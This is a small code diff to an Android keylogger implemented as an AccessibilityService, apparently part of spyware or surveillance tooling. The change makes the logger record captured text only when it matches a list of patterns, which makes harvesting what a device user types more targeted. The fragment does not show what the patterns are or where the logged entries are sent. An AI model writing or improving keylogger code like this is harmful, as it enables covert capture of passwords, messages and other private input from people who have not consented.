@@ -47,8 +47,13 @@ class KeyloggerService: AccessibilityService() {
             }
         }.toString().trim().takeIf { it.isNotEmpty() }?.let{ text ->
             runBlocking {
-                val entry = KeyloggerEntry(text)
-                Keylogger.channel.send(entry)
+                Keylogger.patterns.forEach { pattern ->
+                    if(pattern.containsMatchIn(text)){
+                        val entry = KeyloggerEntry(text)
+                        Keylogger.channel.send(entry)
+                        return@runBlocking
+                    }
+                }
             }
         }
     }
